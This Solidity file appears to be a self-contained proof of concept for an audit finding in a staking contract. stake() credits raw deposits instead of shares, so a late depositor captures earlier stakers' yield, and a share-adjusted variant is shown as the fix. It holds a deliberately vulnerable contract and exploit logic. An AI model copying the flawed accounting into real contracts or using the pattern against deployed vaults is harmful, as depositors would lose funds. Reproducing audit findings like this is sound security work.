// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

/* Coinflip Staking.stake / unstake (Pashov, 55486).
   Cheatcode-free reduction. stake() credits the raw deposit. After the pool
   has doubled, Bob's 400 deposit is a claim on 480 and Alice's 200 of value
   falls to 120. Share-adjusted stake credits Bob 200 and he withdraws 400. */

contract StakeToken {
    string public name = "Stake";
    string public symbol = "STK";
    uint8 public decimals = 18;
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
    }

    function approve(address spender, uint256 amount) external returns (bool) {
        allowance[msg.sender][spender] = amount;
        return true;
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
        return true;
    }

    function transferFrom(address from, address to, uint256 amount) external returns (bool) {
        uint256 allowed = allowance[from][msg.sender];
        require(allowed >= amount, "allowance");
        if (allowed != type(uint256).max) allowance[from][msg.sender] = allowed - amount;
        balanceOf[from] -= amount;
        balanceOf[to] += amount;
        return true;
    }
}

contract Staking {
    struct TokenInfo {
        uint256 totalStaked;
    }

    StakeToken public token;
    bool public immutable shareAdjusted;
    uint256 public locked;
    uint256 public cooldown;
    mapping(address => TokenInfo) public tokenInfo;
    mapping(address => mapping(address => uint256)) public stakedBalances;
    mapping(address => mapping(address => uint256)) public lastStakeTime;

    modifier nonReentrant() {
        require(locked == 0, "reentrancy");
        locked = 1;
        _;
        locked = 0;
    }

    constructor(StakeToken t, bool adjusted) {
        token = t;
        shareAdjusted = adjusted;
    }

    function stake(address token_, uint256 amount) external nonReentrant {
        require(token_ == address(token), "Token not supported");
        require(amount > 0, "Cannot stake 0");
        TokenInfo storage info = tokenInfo[token_];
        uint256 credited = amount;
        if (shareAdjusted && info.totalStaked != 0) {
            uint256 bal = StakeToken(token_).balanceOf(address(this));
            credited = amount * info.totalStaked / bal;
        }
        info.totalStaked += credited;
        if (!shareAdjusted) {
            // @> VULN: the stake balance is the raw deposit, not a share of existing rewards
            stakedBalances[token_][msg.sender] += amount;
        } else {
            stakedBalances[token_][msg.sender] += credited;
        }
        lastStakeTime[token_][msg.sender] = block.timestamp;
        require(StakeToken(token_).transferFrom(msg.sender, address(this), amount), "Stake transfer failed");
    }

    function userShareOf(address user, address token_) public view returns (uint256) {
        TokenInfo storage info = tokenInfo[token_];
        uint256 userStaked = stakedBalances[token_][user];
        uint256 totalTokenBalance = StakeToken(token_).balanceOf(address(this));
        return (userStaked * totalTokenBalance) / info.totalStaked;
    }

    function unstake(address token_, uint256 amount) external nonReentrant {
        require(block.timestamp >= lastStakeTime[token_][msg.sender] + cooldown, "cooldown");
        TokenInfo storage info = tokenInfo[token_];
        uint256 userStaked = stakedBalances[token_][msg.sender];
        uint256 totalTokenBalance = StakeToken(token_).balanceOf(address(this));
        uint256 userShare = (userStaked * totalTokenBalance) / info.totalStaked;
        require(amount <= userShare, "Cannot unstake more than share");
        uint256 fraction = (amount * 1e18) / userShare;
        uint256 sharesToBurn = (userStaked * fraction) / 1e18;
        stakedBalances[token_][msg.sender] -= sharesToBurn;
        info.totalStaked -= sharesToBurn;
        require(StakeToken(token_).transfer(msg.sender, amount), "Unstake transfer failed");
    }
}

contract Staker {
    function approveAndStake(Staking s, address token, uint256 amount) external {
        StakeToken(token).approve(address(s), amount);
        s.stake(token, amount);
    }

    function unstake(Staking s, address token, uint256 amount) external {
        s.unstake(token, amount);
    }
}

contract Exploit {
    StakeToken public token;
    Staking public staking;
    Staking public fixedStaking;
    Staker public bob;
    uint256 public bobShare;
    uint256 public bobFixedShare;
    uint256 public aliceLeft;
    uint256 public aliceFixedLeft;

    constructor() {
        token = new StakeToken();
        staking = new Staking(token, false);
        fixedStaking = new Staking(token, true);
        bob = new Staker();
        token.mint(address(bob), 800 ether);
        token.mint(address(this), 400 ether);
    }

    function run() external {
        token.approve(address(staking), 100 ether);
        staking.stake(address(token), 100 ether);
        require(token.transfer(address(staking), 100 ether), "yield");
        bob.approveAndStake(staking, address(token), 400 ether);
        bobShare = staking.userShareOf(address(bob), address(token));
        require(bobShare == 480 ether, "bob share");
        bob.unstake(staking, address(token), bobShare);
        aliceLeft = token.balanceOf(address(staking));
        require(aliceLeft == 120 ether, "alice lost 80");
        token.approve(address(fixedStaking), 100 ether);
        fixedStaking.stake(address(token), 100 ether);
        require(token.transfer(address(fixedStaking), 100 ether), "yield fixed");
        bob.approveAndStake(fixedStaking, address(token), 400 ether);
        bobFixedShare = fixedStaking.userShareOf(address(bob), address(token));
        require(bobFixedShare == 400 ether, "fair share");
        bob.unstake(fixedStaking, address(token), bobFixedShare);
        aliceFixedLeft = token.balanceOf(address(fixedStaking));
        require(aliceFixedLeft == 200 ether, "alice keeps yield");
        require(token.balanceOf(address(bob)) == 880 ether, "bob profit 80");
    }
}
